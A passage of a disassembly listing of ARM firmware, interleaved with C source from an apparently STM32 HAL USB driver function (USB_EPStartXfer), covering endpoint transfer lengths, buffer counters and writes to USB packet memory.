 80074ea:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80074ee:	2b00      	cmp	r3, #0
 80074f0:	d10a      	bne.n	8007508 <USB_EPStartXfer+0xade>
 80074f2:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80074f4:	881b      	ldrh	r3, [r3, #0]
 80074f6:	b29b      	uxth	r3, r3
 80074f8:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80074fc:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007500:	b29a      	uxth	r2, r3
 8007502:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007504:	801a      	strh	r2, [r3, #0]
 8007506:	e041      	b.n	800758c <USB_EPStartXfer+0xb62>
 8007508:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800750c:	085b      	lsrs	r3, r3, #1
 800750e:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 8007512:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007516:	f003 0301 	and.w	r3, r3, #1
 800751a:	2b00      	cmp	r3, #0
 800751c:	d004      	beq.n	8007528 <USB_EPStartXfer+0xafe>
 800751e:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 8007522:	3301      	adds	r3, #1
 8007524:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 8007528:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 800752a:	881b      	ldrh	r3, [r3, #0]
 800752c:	b29a      	uxth	r2, r3
 800752e:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 8007532:	b29b      	uxth	r3, r3
 8007534:	029b      	lsls	r3, r3, #10
 8007536:	b29b      	uxth	r3, r3
 8007538:	4313      	orrs	r3, r2
 800753a:	b29a      	uxth	r2, r3
 800753c:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 800753e:	801a      	strh	r2, [r3, #0]
 8007540:	e024      	b.n	800758c <USB_EPStartXfer+0xb62>
 8007542:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007546:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800754a:	681b      	ldr	r3, [r3, #0]
 800754c:	785b      	ldrb	r3, [r3, #1]
 800754e:	2b01      	cmp	r3, #1
 8007550:	d11c      	bne.n	800758c <USB_EPStartXfer+0xb62>
 8007552:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007556:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800755a:	681b      	ldr	r3, [r3, #0]
 800755c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007560:	b29b      	uxth	r3, r3
 8007562:	461a      	mov	r2, r3
 8007564:	6f3b      	ldr	r3, [r7, #112]	; 0x70
 8007566:	4413      	add	r3, r2
 8007568:	673b      	str	r3, [r7, #112]	; 0x70
 800756a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800756e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007572:	681b      	ldr	r3, [r3, #0]
 8007574:	781b      	ldrb	r3, [r3, #0]
 8007576:	00da      	lsls	r2, r3, #3
 8007578:	6f3b      	ldr	r3, [r7, #112]	; 0x70
 800757a:	4413      	add	r3, r2
 800757c:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007580:	66fb      	str	r3, [r7, #108]	; 0x6c
 8007582:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007586:	b29a      	uxth	r2, r3
 8007588:	6efb      	ldr	r3, [r7, #108]	; 0x6c
 800758a:	801a      	strh	r2, [r3, #0]
          pmabuffer = ep->pmaaddr1;
 800758c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007590:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007594:	681b      	ldr	r3, [r3, #0]
 8007596:	895b      	ldrh	r3, [r3, #10]
 8007598:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

          /* Write the user buffer to USB PMA */
          USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 800759c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075a0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80075a4:	681b      	ldr	r3, [r3, #0]
 80075a6:	6959      	ldr	r1, [r3, #20]
 80075a8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80075ac:	b29b      	uxth	r3, r3
 80075ae:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 80075b2:	f507 7084 	add.w	r0, r7, #264	; 0x108
 80075b6:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 80075ba:	6800      	ldr	r0, [r0, #0]
 80075bc:	f000 ff41 	bl	8008442 <USB_WritePMA>
 80075c0:	e0ca      	b.n	8007758 <USB_EPStartXfer+0xd2e>
        }
        else
        {
          /* Set the Double buffer counter for pmabuffer0 */
          PCD_SET_EP_DBUF0_CNT(USBx, ep->num, ep->is_in, len);
 80075c2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075c6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80075ca:	681b      	ldr	r3, [r3, #0]
 80075cc:	785b      	ldrb	r3, [r3, #1]
 80075ce:	2b00      	cmp	r3, #0
 80075d0:	d177      	bne.n	80076c2 <USB_EPStartXfer+0xc98>
 80075d2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075d6:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80075da:	681b      	ldr	r3, [r3, #0]
 80075dc:	67fb      	str	r3, [r7, #124]	; 0x7c
 80075de:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075e2:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80075e6:	681b      	ldr	r3, [r3, #0]
 80075e8:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80075ec:	b29b      	uxth	r3, r3
 80075ee:	461a      	mov	r2, r3
 80075f0:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 80075f2:	4413      	add	r3, r2
 80075f4:	67fb      	str	r3, [r7, #124]	; 0x7c
 80075f6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075fa:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80075fe:	681b      	ldr	r3, [r3, #0]
 8007600:	781b      	ldrb	r3, [r3, #0]
 8007602:	00da      	lsls	r2, r3, #3
 8007604:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 8007606:	4413      	add	r3, r2
 8007608:	f203 4302 	addw	r3, r3, #1026	; 0x402
 800760c:	67bb      	str	r3, [r7, #120]	; 0x78
 800760e:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8007610:	881b      	ldrh	r3, [r3, #0]
 8007612:	b29b      	uxth	r3, r3
 8007614:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007618:	b29a      	uxth	r2, r3
 800761a:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 800761c:	801a      	strh	r2, [r3, #0]
 800761e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007622:	2b3e      	cmp	r3, #62	; 0x3e
 8007624:	d921      	bls.n	800766a <USB_EPStartXfer+0xc40>
 8007626:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800762a:	095b      	lsrs	r3, r3, #5
 800762c:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 8007630:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007634:	f003 031f 	and.w	r3, r3, #31
 8007638:	2b00      	cmp	r3, #0
 800763a:	d104      	bne.n	8007646 <USB_EPStartXfer+0xc1c>
 800763c:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 8007640:	3b01      	subs	r3, #1
 8007642:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 8007646:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8007648:	881b      	ldrh	r3, [r3, #0]
 800764a:	b29a      	uxth	r2, r3
 800764c:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 8007650:	b29b      	uxth	r3, r3
 8007652:	029b      	lsls	r3, r3, #10
 8007654:	b29b      	uxth	r3, r3
 8007656:	4313      	orrs	r3, r2
 8007658:	b29b      	uxth	r3, r3
 800765a:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800765e:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007662:	b29a      	uxth	r2, r3
 8007664:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8007666:	801a      	strh	r2, [r3, #0]
 8007668:	e05c      	b.n	8007724 <USB_EPStartXfer+0xcfa>
 800766a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800766e:	2b00      	cmp	r3, #0
 8007670:	d10a      	bne.n	8007688 <USB_EPStartXfer+0xc5e>
 8007672:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8007674:	881b      	ldrh	r3, [r3, #0]
 8007676:	b29b      	uxth	r3, r3
 8007678:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800767c:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007680:	b29a      	uxth	r2, r3
 8007682:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8007684:	801a      	strh	r2, [r3, #0]
 8007686:	e04d      	b.n	8007724 <USB_EPStartXfer+0xcfa>
 8007688:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800768c:	085b      	lsrs	r3, r3, #1
 800768e:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 8007692:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007696:	f003 0301 	and.w	r3, r3, #1
 800769a:	2b00      	cmp	r3, #0
 800769c:	d004      	beq.n	80076a8 <USB_EPStartXfer+0xc7e>
 800769e:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 80076a2:	3301      	adds	r3, #1
 80076a4:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 80076a8:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80076aa:	881b      	ldrh	r3, [r3, #0]
 80076ac:	b29a      	uxth	r2, r3
 80076ae:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 80076b2:	b29b      	uxth	r3, r3
 80076b4:	029b      	lsls	r3, r3, #10
 80076b6:	b29b      	uxth	r3, r3
 80076b8:	4313      	orrs	r3, r2
 80076ba:	b29a      	uxth	r2, r3
 80076bc:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80076be:	801a      	strh	r2, [r3, #0]
 80076c0:	e030      	b.n	8007724 <USB_EPStartXfer+0xcfa>
 80076c2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80076c6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80076ca:	681b      	ldr	r3, [r3, #0]
 80076cc:	785b      	ldrb	r3, [r3, #1]
 80076ce:	2b01      	cmp	r3, #1
 80076d0:	d128      	bne.n	8007724 <USB_EPStartXfer+0xcfa>
 80076d2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80076d6:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80076da:	681b      	ldr	r3, [r3, #0]
 80076dc:	f8c7 3084 	str.w	r3, [r7, #132]	; 0x84
 80076e0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80076e4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80076e8:	681b      	ldr	r3, [r3, #0]
 80076ea:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80076ee:	b29b      	uxth	r3, r3
 80076f0:	461a      	mov	r2, r3
 80076f2:	f8d7 3084 	ldr.w	r3, [r7, #132]	; 0x84
 80076f6:	4413      	add	r3, r2
 80076f8:	f8c7 3084 	str.w	r3, [r7, #132]	; 0x84
 80076fc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007700:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007704:	681b      	ldr	r3, [r3, #0]
 8007706:	781b      	ldrb	r3, [r3, #0]
 8007708:	00da      	lsls	r2, r3, #3
 800770a:	f8d7 3084 	ldr.w	r3, [r7, #132]	; 0x84
 800770e:	4413      	add	r3, r2
 8007710:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007714:	f8c7 3080 	str.w	r3, [r7, #128]	; 0x80
 8007718:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800771c:	b29a      	uxth	r2, r3
 800771e:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 8007722:	801a      	strh	r2, [r3, #0]
          pmabuffer = ep->pmaaddr0;
 8007724:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007728:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800772c:	681b      	ldr	r3, [r3, #0]
 800772e:	891b      	ldrh	r3, [r3, #8]
 8007730:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

          /* Write the user buffer to USB PMA */
          USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8007734:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007738:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800773c:	681b      	ldr	r3, [r3, #0]
 800773e:	6959      	ldr	r1, [r3, #20]
 8007740:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007744:	b29b      	uxth	r3, r3
 8007746:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 800774a:	f507 7084 	add.w	r0, r7, #264	; 0x108
 800774e:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8007752:	6800      	ldr	r0, [r0, #0]
 8007754:	f000 fe75 	bl	8008442 <USB_WritePMA>
        }
      }
    }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

    PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_VALID);
 8007758:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800775c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007760:	681a      	ldr	r2, [r3, #0]
 8007762:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007766:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800776a:	681b      	ldr	r3, [r3, #0]
 800776c:	781b      	ldrb	r3, [r3, #0]
 800776e:	009b      	lsls	r3, r3, #2
 8007770:	4413      	add	r3, r2
 8007772:	881b      	ldrh	r3, [r3, #0]
 8007774:	b29b      	uxth	r3, r3
 8007776:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800777a:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 800777e:	817b      	strh	r3, [r7, #10]
 8007780:	897b      	ldrh	r3, [r7, #10]
 8007782:	f083 0310 	eor.w	r3, r3, #16
 8007786:	817b      	strh	r3, [r7, #10]
 8007788:	897b      	ldrh	r3, [r7, #10]
 800778a:	f083 0320 	eor.w	r3, r3, #32
 800778e:	817b      	strh	r3, [r7, #10]
 8007790:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007794:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007798:	681a      	ldr	r2, [r3, #0]
 800779a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800779e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80077a2:	681b      	ldr	r3, [r3, #0]
 80077a4:	781b      	ldrb	r3, [r3, #0]
 80077a6:	009b      	lsls	r3, r3, #2
 80077a8:	441a      	add	r2, r3
 80077aa:	897b      	ldrh	r3, [r7, #10]
 80077ac:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80077b0:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80077b4:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80077b8:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80077bc:	b29b      	uxth	r3, r3
 80077be:	8013      	strh	r3, [r2, #0]
 80077c0:	f000 bcde 	b.w	8008180 <USB_EPStartXfer+0x1756>
  }
  else /* OUT endpoint */
  {
    if (ep->doublebuffer == 0U)
 80077c4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077c8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80077cc:	681b      	ldr	r3, [r3, #0]
 80077ce:	7b1b      	ldrb	r3, [r3, #12]
 80077d0:	2b00      	cmp	r3, #0
 80077d2:	f040 80bb 	bne.w	800794c <USB_EPStartXfer+0xf22>
    {
      /* Multi packet transfer */
      if (ep->xfer_len > ep->maxpacket)
 80077d6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077da:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80077de:	681b      	ldr	r3, [r3, #0]
 80077e0:	699a      	ldr	r2, [r3, #24]
 80077e2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077e6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80077ea:	681b      	ldr	r3, [r3, #0]
 80077ec:	691b      	ldr	r3, [r3, #16]
 80077ee:	429a      	cmp	r2, r3
 80077f0:	d917      	bls.n	8007822 <USB_EPStartXfer+0xdf8>
      {
        len = ep->maxpacket;
 80077f2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077f6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80077fa:	681b      	ldr	r3, [r3, #0]
 80077fc:	691b      	ldr	r3, [r3, #16]
 80077fe:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
        ep->xfer_len -= len;
 8007802:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007806:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800780a:	681b      	ldr	r3, [r3, #0]
 800780c:	699a      	ldr	r2, [r3, #24]
 800780e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007812:	1ad2      	subs	r2, r2, r3
 8007814:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007818:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800781c:	681b      	ldr	r3, [r3, #0]
 800781e:	619a      	str	r2, [r3, #24]
 8007820:	e00e      	b.n	8007840 <USB_EPStartXfer+0xe16>
      }
      else
      {
        len = ep->xfer_len;
 8007822:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007826:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800782a:	681b      	ldr	r3, [r3, #0]
 800782c:	699b      	ldr	r3, [r3, #24]
 800782e:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
        ep->xfer_len = 0U;
 8007832:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007836:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800783a:	681b      	ldr	r3, [r3, #0]
 800783c:	2200      	movs	r2, #0
 800783e:	619a      	str	r2, [r3, #24]
      }
      /* configure and validate Rx endpoint */
      PCD_SET_EP_RX_CNT(USBx, ep->num, len);
 8007840:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007844:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007848:	681b      	ldr	r3, [r3, #0]
 800784a:	f8c7 3090 	str.w	r3, [r7, #144]	; 0x90
 800784e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007852:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007856:	681b      	ldr	r3, [r3, #0]
 8007858:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800785c:	b29b      	uxth	r3, r3
 800785e:	461a      	mov	r2, r3
 8007860:	f8d7 3090 	ldr.w	r3, [r7, #144]	; 0x90
 8007864:	4413      	add	r3, r2
 8007866:	f8c7 3090 	str.w	r3, [r7, #144]	; 0x90
 800786a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800786e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007872:	681b      	ldr	r3, [r3, #0]
 8007874:	781b      	ldrb	r3, [r3, #0]
 8007876:	00da      	lsls	r2, r3, #3
 8007878:	f8d7 3090 	ldr.w	r3, [r7, #144]	; 0x90
 800787c:	4413      	add	r3, r2
 800787e:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007882:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
 8007886:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800788a:	881b      	ldrh	r3, [r3, #0]
 800788c:	b29b      	uxth	r3, r3
 800788e:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007892:	b29a      	uxth	r2, r3
 8007894:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007898:	801a      	strh	r2, [r3, #0]
 800789a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800789e:	2b3e      	cmp	r3, #62	; 0x3e
 80078a0:	d924      	bls.n	80078ec <USB_EPStartXfer+0xec2>
 80078a2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80078a6:	095b      	lsrs	r3, r3, #5
 80078a8:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 80078ac:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80078b0:	f003 031f 	and.w	r3, r3, #31
 80078b4:	2b00      	cmp	r3, #0
 80078b6:	d104      	bne.n	80078c2 <USB_EPStartXfer+0xe98>
 80078b8:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 80078bc:	3b01      	subs	r3, #1
 80078be:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 80078c2:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80078c6:	881b      	ldrh	r3, [r3, #0]
 80078c8:	b29a      	uxth	r2, r3
 80078ca:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 80078ce:	b29b      	uxth	r3, r3
 80078d0:	029b      	lsls	r3, r3, #10
 80078d2:	b29b      	uxth	r3, r3
 80078d4:	4313      	orrs	r3, r2
 80078d6:	b29b      	uxth	r3, r3
 80078d8:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80078dc:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80078e0:	b29a      	uxth	r2, r3
 80078e2:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80078e6:	801a      	strh	r2, [r3, #0]
 80078e8:	f000 bc10 	b.w	800810c <USB_EPStartXfer+0x16e2>
 80078ec:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80078f0:	2b00      	cmp	r3, #0
 80078f2:	d10c      	bne.n	800790e <USB_EPStartXfer+0xee4>
 80078f4:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80078f8:	881b      	ldrh	r3, [r3, #0]
 80078fa:	b29b      	uxth	r3, r3
 80078fc:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007900:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007904:	b29a      	uxth	r2, r3
 8007906:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800790a:	801a      	strh	r2, [r3, #0]
 800790c:	e3fe      	b.n	800810c <USB_EPStartXfer+0x16e2>
 800790e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007912:	085b      	lsrs	r3, r3, #1
 8007914:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 8007918:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800791c:	f003 0301 	and.w	r3, r3, #1
 8007920:	2b00      	cmp	r3, #0
 8007922:	d004      	beq.n	800792e <USB_EPStartXfer+0xf04>
 8007924:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 8007928:	3301      	adds	r3, #1
 800792a:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 800792e:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007932:	881b      	ldrh	r3, [r3, #0]
 8007934:	b29a      	uxth	r2, r3
 8007936:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 800793a:	b29b      	uxth	r3, r3
 800793c:	029b      	lsls	r3, r3, #10
 800793e:	b29b      	uxth	r3, r3
 8007940:	4313      	orrs	r3, r2
 8007942:	b29a      	uxth	r2, r3
 8007944:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007948:	801a      	strh	r2, [r3, #0]
 800794a:	e3df      	b.n	800810c <USB_EPStartXfer+0x16e2>
#if (USE_USB_DOUBLE_BUFFER == 1U)
    else
    {
      /* First Transfer Coming From HAL_PCD_EP_Receive & From ISR */
      /* Set the Double buffer counter */
      if (ep->type == EP_TYPE_BULK)
 800794c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007950:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007954:	681b      	ldr	r3, [r3, #0]
 8007956:	78db      	ldrb	r3, [r3, #3]
 8007958:	2b02      	cmp	r3, #2
 800795a:	f040 8218 	bne.w	8007d8e <USB_EPStartXfer+0x1364>
      {
        PCD_SET_EP_DBUF_CNT(USBx, ep->num, ep->is_in, ep->maxpacket);
 800795e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007962:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007966:	681b      	ldr	r3, [r3, #0]
 8007968:	785b      	ldrb	r3, [r3, #1]
 800796a:	2b00      	cmp	r3, #0
 800796c:	f040 809d 	bne.w	8007aaa <USB_EPStartXfer+0x1080>
 8007970:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007974:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007978:	681b      	ldr	r3, [r3, #0]
 800797a:	f8c7 30ac 	str.w	r3, [r7, #172]	; 0xac
 800797e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007982:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007986:	681b      	ldr	r3, [r3, #0]
 8007988:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800798c:	b29b      	uxth	r3, r3
 800798e:	461a      	mov	r2, r3
 8007990:	f8d7 30ac 	ldr.w	r3, [r7, #172]	; 0xac
 8007994:	4413      	add	r3, r2
 8007996:	f8c7 30ac 	str.w	r3, [r7, #172]	; 0xac
 800799a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800799e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079a2:	681b      	ldr	r3, [r3, #0]
 80079a4:	781b      	ldrb	r3, [r3, #0]
 80079a6:	00da      	lsls	r2, r3, #3
 80079a8:	f8d7 30ac 	ldr.w	r3, [r7, #172]	; 0xac
 80079ac:	4413      	add	r3, r2
 80079ae:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80079b2:	f8c7 30a8 	str.w	r3, [r7, #168]	; 0xa8
 80079b6:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 80079ba:	881b      	ldrh	r3, [r3, #0]
 80079bc:	b29b      	uxth	r3, r3
 80079be:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80079c2:	b29a      	uxth	r2, r3
 80079c4:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 80079c8:	801a      	strh	r2, [r3, #0]
 80079ca:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079ce:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079d2:	681b      	ldr	r3, [r3, #0]
 80079d4:	691b      	ldr	r3, [r3, #16]
 80079d6:	2b3e      	cmp	r3, #62	; 0x3e
 80079d8:	d92b      	bls.n	8007a32 <USB_EPStartXfer+0x1008>
 80079da:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079de:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079e2:	681b      	ldr	r3, [r3, #0]
 80079e4:	691b      	ldr	r3, [r3, #16]
 80079e6:	095b      	lsrs	r3, r3, #5
 80079e8:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 80079ec:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079f0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079f4:	681b      	ldr	r3, [r3, #0]
 80079f6:	691b      	ldr	r3, [r3, #16]
 80079f8:	f003 031f 	and.w	r3, r3, #31
 80079fc:	2b00      	cmp	r3, #0
 80079fe:	d104      	bne.n	8007a0a <USB_EPStartXfer+0xfe0>
 8007a00:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007a04:	3b01      	subs	r3, #1
 8007a06:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 8007a0a:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007a0e:	881b      	ldrh	r3, [r3, #0]
 8007a10:	b29a      	uxth	r2, r3
 8007a12:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007a16:	b29b      	uxth	r3, r3
 8007a18:	029b      	lsls	r3, r3, #10
 8007a1a:	b29b      	uxth	r3, r3
 8007a1c:	4313      	orrs	r3, r2
 8007a1e:	b29b      	uxth	r3, r3
 8007a20:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007a24:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007a28:	b29a      	uxth	r2, r3
 8007a2a:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007a2e:	801a      	strh	r2, [r3, #0]
 8007a30:	e070      	b.n	8007b14 <USB_EPStartXfer+0x10ea>
 8007a32:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a36:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a3a:	681b      	ldr	r3, [r3, #0]
 8007a3c:	691b      	ldr	r3, [r3, #16]
 8007a3e:	2b00      	cmp	r3, #0
 8007a40:	d10c      	bne.n	8007a5c <USB_EPStartXfer+0x1032>
 8007a42:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
